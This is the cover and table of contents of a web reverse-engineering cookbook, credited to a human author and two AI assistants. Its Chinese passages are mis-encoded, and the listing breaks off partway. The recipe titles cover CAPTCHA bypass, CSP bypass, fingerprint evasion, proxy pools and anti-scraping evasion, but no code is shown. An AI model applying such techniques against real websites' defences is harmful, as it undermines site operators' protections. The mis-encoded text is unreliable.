
        <!DOCTYPE html>
        <html lang="zh-CN">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Web Reverse Engineering Cookbook</title>
        </head>
        <body>
        
        <div class="cover-page">
            <div style="margin-top: 120pt;">
                <h1 style="font-size: 40pt; color: #1a1a1a; margin-bottom: 20pt; border: none; page-break-before: auto;" class="no-page-break">
                    Web Reverse Engineering<br/>Cookbook
                </h1>
                <h2 style="font-size: 18pt; color: #666; font-weight: 400; border: none; padding: 0;">
                    Complete Guide to Web Security Analysis & Data Extraction
                </h2>
                <div style="margin-top: 50pt; font-size: 12pt; color: #888;">
                    <p>Browser DevTools, Traffic Analysis, JavaScript Deobfuscation</p>
                    <p>CAPTCHA Bypass, Fingerprinting, Anti-Scraping Techniques</p>
                    <p>Distributed Crawling, Engineering Best Practices</p>
                </div>
            </div>
        </div>
        <div style="page-break-before: always; text-align: center; margin-top: 60pt;">
            <div style="font-size: 12pt; color: #aaa;">
                <p style="font-size: 40pt; margin-bottom: 15pt;">&#x1F310;</p>
                <p style="font-size: 16pt; color: #666; margin-bottom: 20pt;"><strong>Authors: +5, Gemini Pro 3.0, Claude Code Opus 4.5</strong></p>
                <p>Email: overkazaf@gmail.com</p>
                <p>WeChat: _0xAF_</p>
                <p style="margin-top: 25pt;">Date: 2025-12-19</p>
                <p>Version: v2.0</p>
            </div>
            <div style="margin-top: 30pt; padding: 20pt 35pt; background-color: #fff8e1; border-radius: 8pt; border-left: 4px solid #ffa726; text-align: left;">
                <p style="font-size: 13pt; color: #e65100; font-weight: 600; margin-bottom: 12pt; text-align: center;">
                    About This Cookbook | å…³äºè¿™æœ¬é£Ÿè°±
                </p>
                <p style="font-size: 10pt; color: #444; line-height: 1.8; text-align: justify; margin-bottom: 10pt;">
                    è¿™æœ¬é£Ÿè°±çš„è¯ç”Ÿï¼Œæ˜¯ä¸€æ¬¡æœ‰è¶£çš„<strong>äººæœºåä½œ</strong>å®éªŒã€‚é™¤äº†ç¬”è€…ï¼ˆ<strong>+5</strong>ï¼‰åœ¨Webé€†å‘å·¥ç¨‹é¢†åŸŸçš„æ—¥å¸¸è®°å½•å’Œå®æˆ˜ç»éªŒç§¯ç´¯ï¼Œ
                    æœ¬ä¹¦è¿˜å¾—åˆ°äº†ä¸¤ä½AIåŠ©æ‰‹çš„é¼åŠ›æ”¯æŒâ€”â€”<strong>Gemini Pro 3.0</strong>å’Œ<strong>Claude Code Opus 4.5</strong>ã€‚
                    è¿™ä¸ªåä½œè¿‡ç¨‹å°±åƒä¸€ä¸ªçœŸå®çš„æŠ€æœ¯å›¢é˜Ÿï¼š
                </p>
                <div style="margin-left: 15pt; margin-bottom: 10pt;">
                    <p style="font-size: 9.5pt; color: #444; line-height: 1.7; margin-bottom: 6pt;">
                        <strong>Gemini Pro 3.0</strong>ï¼ˆç ”ç©¶å‘˜ & çŸ¥è¯†æ¶æ„å¸ˆï¼‰ï¼šè´Ÿè´£æŠ€æœ¯è°ƒç ”ã€èµ„æ–™æœé›†ã€çŸ¥è¯†ä½“ç³»æ•´ç†ï¼Œ
                        ä»¥åŠæä¾›æŠ€æœ¯æ€è·¯å’Œè§£å†³æ–¹æ¡ˆå»ºè®®ï¼Œå°±åƒå›¢é˜Ÿä¸­çš„æŠ€æœ¯é¡¾é—®å’ŒçŸ¥è¯†ç®¡å®¶ã€‚
                    </p>
                    <p style="font-size: 9.5pt; color: #444; line-height: 1.7; margin-bottom: 6pt;">
                        <strong>Claude Code Opus 4.5</strong>ï¼ˆè½¯ä»¶å·¥ç¨‹å¸ˆ & è‡ªåŠ¨åŒ–ä¸“å®¶ï¼‰ï¼šè´Ÿè´£ç¼–å†™å’Œä¼˜åŒ–ä»£ç ç¤ºä¾‹ã€
                        æ‰¹é‡å¤„ç†Markdownæ ¼å¼é—®é¢˜ã€è‡ªåŠ¨åŒ–æ–‡æ¡£ç”Ÿæˆæµç¨‹ï¼Œä»¥åŠä»£ç è´¨é‡æŠŠå…³ï¼Œå°±åƒå›¢é˜Ÿä¸­çš„å…¨æ ˆå¼€å‘å’ŒDevOpså·¥ç¨‹å¸ˆã€‚
                    </p>
                    <p style="font-size: 9.5pt; color: #444; line-height: 1.7; margin-bottom: 6pt;">
                        <strong>+5</strong>ï¼ˆæŠ€æœ¯è´Ÿè´£äºº & æ€»ç¼–è¾‘ï¼‰ï¼šè´Ÿè´£æ•´ä½“æ¶æ„è®¾è®¡ã€æŠ€æœ¯æ–¹å‘æŠŠæ§ã€å†…å®¹å®¡æ ¸ä¿®è®¢ã€
                        ä»¥åŠæœ€ç»ˆè´¨é‡ä¿éšœï¼Œå°±åƒå›¢é˜Ÿä¸­çš„Tech Leadå’ŒEditor-in-Chiefã€‚
                    </p>
                </div>
                <p style="font-size: 9.5pt; color: #555; line-height: 1.7; text-align: justify; font-style: italic;">
                    This cookbook is born from an intriguing human-AI collaboration, like a real tech team:
                    Gemini Pro 3.0 (Research Engineer) handles technical research and knowledge organization;
                    Claude Code Opus 4.5 (Software Engineer) crafts code examples and automates documentation;
                    +5 (Tech Lead) steers the architecture, content revision, and quality assurance.
                </p>
            </div>
            <div style="margin-top: 25pt; padding: 18pt 35pt; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd;">
                <p style="font-size: 11pt; color: #555; font-style: italic; line-height: 1.7; text-align: center;">
                    "If the highest aim of a captain were to preserve his ship,<br/>
                    he would keep it in port forever."
                </p>
                <p style="font-size: 9pt; color: #888; text-align: right; margin-top: 8pt;">
                    â€” St. Thomas Aquinas, <em>Summa Theologica</em> (1265-1274)
                </p>
            </div>
            <div style="margin-top: 25pt; padding: 18pt 35pt; background-color: #e3f2fd; border-radius: 8pt;">
                <p style="font-size: 11pt; color: #1565c0; font-weight: 600; margin-bottom: 10pt; text-align: center;">
                    Recipe ç¼–å·ç³»ç»Ÿ | Recipe Numbering System
                </p>
                <p style="font-size: 10pt; color: #444; line-height: 1.8; text-align: justify;">
                    æœ¬ä¹¦ä¸­çš„æ¯ä¸ªRecipeéƒ½æœ‰å”¯ä¸€ç¼–å·ï¼ˆR01, R02, ...ï¼‰ï¼Œä¾¿äºå¿«é€Ÿå®šä½å’Œäº¤å‰å¼•ç”¨ã€‚
                    ç›®å½•é¡µé¢ä¼šæ˜¾ç¤ºæ‰€æœ‰RecipeåŠå…¶ç¼–å·ï¼Œå¸®åŠ©ä½ å¿«é€Ÿæ‰¾åˆ°éœ€è¦çš„å†…å®¹ã€‚
                </p>
                <p style="font-size: 9.5pt; color: #666; line-height: 1.7; text-align: justify; font-style: italic; margin-top: 8pt;">
                    Each recipe in this cookbook is assigned a unique identifier (R01, R02, etc.) for easy reference.
                    The table of contents displays all recipes with their numbers.
                </p>
            </div>
        </div>
        
        <div class="toc-page">
            <h1 class="toc-title no-page-break">Table of Contents | ç›®å½•</h1>
        
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part I: Getting Started
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Quick Start</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R00</span><span style="color: #555; font-size: 9.5pt;">Overview</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R01</span><span style="color: #555; font-size: 9.5pt;">Your First Hook</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R02</span><span style="color: #555; font-size: 9.5pt;">Decrypt API Params</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R03</span><span style="color: #555; font-size: 9.5pt;">Bypass Simple CAPTCHA</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part II: Kitchen Basics
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Foundations</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R04</span><span style="color: #555; font-size: 9.5pt;">HTTP/HTTPS Protocol</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R05</span><span style="color: #555; font-size: 9.5pt;">Browser Architecture</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R06</span><span style="color: #555; font-size: 9.5pt;">JavaScript Basics</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R07</span><span style="color: #555; font-size: 9.5pt;">JavaScript Execution Mechanism</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R08</span><span style="color: #555; font-size: 9.5pt;">DOM And BOM</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R09</span><span style="color: #555; font-size: 9.5pt;">WebAssembly Basics</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R10</span><span style="color: #555; font-size: 9.5pt;">Cookie And Storage</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R11</span><span style="color: #555; font-size: 9.5pt;">CORS And Same Origin Policy</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R12</span><span style="color: #555; font-size: 9.5pt;">TLS/SSL Handshake</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R13</span><span style="color: #555; font-size: 9.5pt;">Web API And Ajax</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part III: Tools & Ingredients
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Tooling</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R14</span><span style="color: #555; font-size: 9.5pt;">Browser DevTools</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R15</span><span style="color: #555; font-size: 9.5pt;">Burp Suite Guide</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R16</span><span style="color: #555; font-size: 9.5pt;">Fiddler Guide</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R17</span><span style="color: #555; font-size: 9.5pt;">Charles Guide</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R18</span><span style="color: #555; font-size: 9.5pt;">Wireshark Guide</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R19</span><span style="color: #555; font-size: 9.5pt;">Puppeteer & Playwright</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R20</span><span style="color: #555; font-size: 9.5pt;">Selenium Guide</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R21</span><span style="color: #555; font-size: 9.5pt;">AST Tools</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R22</span><span style="color: #555; font-size: 9.5pt;">Node.js Debugging</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R23</span><span style="color: #555; font-size: 9.5pt;">V8 Tools</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part IV: Basic Recipes
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Basic Recipes</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R24</span><span style="color: #555; font-size: 9.5pt;">RE Workflow</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R25</span><span style="color: #555; font-size: 9.5pt;">Debugging Techniques</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R26</span><span style="color: #555; font-size: 9.5pt;">Hooking Techniques</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R27</span><span style="color: #555; font-size: 9.5pt;">API Reverse Engineering</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R28</span><span style="color: #555; font-size: 9.5pt;">Crypto Identification</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R29</span><span style="color: #555; font-size: 9.5pt;">Dynamic Parameter Analysis</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R30</span><span style="color: #555; font-size: 9.5pt;">WebSocket Reversing</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part V: Advanced Recipes
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Advanced Recipes</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R31</span><span style="color: #555; font-size: 9.5pt;">JavaScript Deobfuscation</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R32</span><span style="color: #555; font-size: 9.5pt;">CAPTCHA Bypass</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R33</span><span style="color: #555; font-size: 9.5pt;">Browser Fingerprinting</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R34</span><span style="color: #555; font-size: 9.5pt;">JavaScript VM Protection</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R35</span><span style="color: #555; font-size: 9.5pt;">WebAssembly Reversing</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R36</span><span style="color: #555; font-size: 9.5pt;">Anti-Scraping Deep Dive</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R37</span><span style="color: #555; font-size: 9.5pt;">Frontend Hardening</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R38</span><span style="color: #555; font-size: 9.5pt;">CSP Bypass</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R39</span><span style="color: #555; font-size: 9.5pt;">WebRTC Fingerprinting</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R40</span><span style="color: #555; font-size: 9.5pt;">Canvas Fingerprinting</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R41</span><span style="color: #555; font-size: 9.5pt;">TLS Fingerprinting</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R42</span><span style="color: #555; font-size: 9.5pt;">HTTP/2 & HTTP/3</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R43</span><span style="color: #555; font-size: 9.5pt;">PWA & Service Worker</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part VI: Complete Menus
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Case Studies</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R44</span><span style="color: #555; font-size: 9.5pt;">E-commerce</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R45</span><span style="color: #555; font-size: 9.5pt;">Social Media</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R46</span><span style="color: #555; font-size: 9.5pt;">Financial Websites</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R47</span><span style="color: #555; font-size: 9.5pt;">Video Streaming</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R48</span><span style="color: #555; font-size: 9.5pt;">News Aggregator</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R49</span><span style="color: #555; font-size: 9.5pt;">Search Engine</span>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Engineering</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R50</span><span style="color: #555; font-size: 9.5pt;">Distributed Scraping</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R51</span><span style="color: #555; font-size: 9.5pt;">Proxy Pool Management</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R52</span><span style="color: #555; font-size: 9.5pt;">Data Storage Solutions</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R53</span><span style="color: #555; font-size: 9.5pt;">Message Queue Application</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R54</span><span style="color: #555; font-size: 9.5pt;">Docker Deployment</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R55</span><span style="color: #555; font-size: 9.5pt;">Monitoring And Alerting</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R56</span><span style="color: #555; font-size: 9.5pt;">Anti-Anti-Scraping Framework</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part VII: Code Kitchen
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 8pt; margin-bottom: 4pt;">
                        <span style="font-weight: 600; color: #444; font-size: 10.5pt;">Scripts</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R57</span><span style="color: #555; font-size: 9.5pt;">JavaScript Hook Scripts</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R58</span><span style="color: #555; font-size: 9.5pt;">Deobfuscation Scripts</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
